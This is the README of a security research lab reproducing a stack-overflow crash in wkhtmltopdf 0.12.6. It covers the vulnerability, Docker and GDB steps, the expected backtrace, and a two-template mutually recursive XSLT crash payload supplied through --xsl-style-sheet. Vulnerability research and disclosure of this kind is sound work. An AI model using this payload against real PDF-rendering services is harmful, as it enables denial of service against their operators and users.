# wkhtmltopdf XSLT Stack Overflow Lab

Reproducible lab for CVE research on wkhtmltopdf 0.12.6 — XSLT `<xsl:call-template>` infinite recursion triggering a stack overflow via Qt's QPatternist engine.

## Vulnerability

wkhtmltopdf's `--xsl-style-sheet` flag passes an attacker-controlled XSLT to Qt's QPatternist engine. QPatternist has **no recursion depth check** in `CallTemplate::evaluateToSequenceReceiver` — mutual recursion between two templates exhausts the C-stack and heap simultaneously.

**Crash signature:**
- Exit 137 (SIGKILL — OOM killer fires)
- or Exit 139 (SIGSEGV — stack overflows into heap arena)
- GDB: crash inside `_int_malloc` ← `QPatternist::DynamicContext::createStack`

## Requirements

- Docker (tested with 24.x)
- No other dependencies — the pre-built debug binary is downloaded automatically during `make build`

## Quick Start

```bash
git clone https://github.com/TableBsse/wkhtmltopdf-stackoverflow-lab.git
cd wkhtmltopdf-stackoverflow-lab

# Build the image (first time: ~5-10 min)
make build

# Trigger the crash
make crash

# Interactive GDB session
make gdb
```

## GDB Session

After `make gdb`, inside gdb:

```gdb
run
# → crash happens

bt 50              # short backtrace — shows the recursion
bt full            # full backtrace with locals
frame 2            # jump to DynamicContext::createStack
info registers     # register state at crash
x/20x $rsp        # stack memory
```

Expected backtrace pattern:
```
#0  _int_malloc (av=..., bytes=72)
#1  operator new(unsigned long)
#2  QPatternist::DynamicContext::createStack()
#3  QPatternist::Template::createContext(...)
#4  QPatternist::CallTemplate::evaluateToSequenceReceiver(...)
#5  QPatternist::CallTemplate::evaluateToSequenceReceiver(...)   ← recursion
#6  QPatternist::CallTemplate::evaluateToSequenceReceiver(...)   ← recursion
... (30+ identical frames)
```

## Payload

`payloads/crash.xsl` — two XSLT templates in mutual infinite recursion:

```xml
<xsl:template name="a"><xsl:call-template name="b"/></xsl:template>
<xsl:template name="b"><xsl:call-template name="a"/></xsl:template>
```

`payloads/trigger.html` — minimal HTML page to render.

## Makefile Targets

| Target | Description |
|--------|-------------|
| `make build` | Build the Docker image (compiles wkhtmltopdf with debug symbols) |
| `make crash` | Run the crash test (exit 137 or 139) |
| `make gdb` | Open interactive GDB session |
| `make shell` | Shell inside the lab container |
| `make clean` | Remove image and output files |

## Affected Code

`src/lib/pdfconverter.cc` — passes `--xsl-style-sheet` directly to Qt's `QXmlQuery`.  
Qt `xmlpatterns/expr/calltemplate.cpp` — `evaluateToSequenceReceiver` has no recursion depth guard.

## Exploitability Notes

- Crash is deterministic and 100% reproducible
- Triggered by an attacker-supplied XSL file via `--xsl-style-sheet`
- Also reproducible on the release (non-debug) binary — use the existing `wkhtmltopdf-lab:bionic` Docker image
- Stack canary and ASLR state: run `checksec --file=./bin/wkhtmltopdf` inside the container
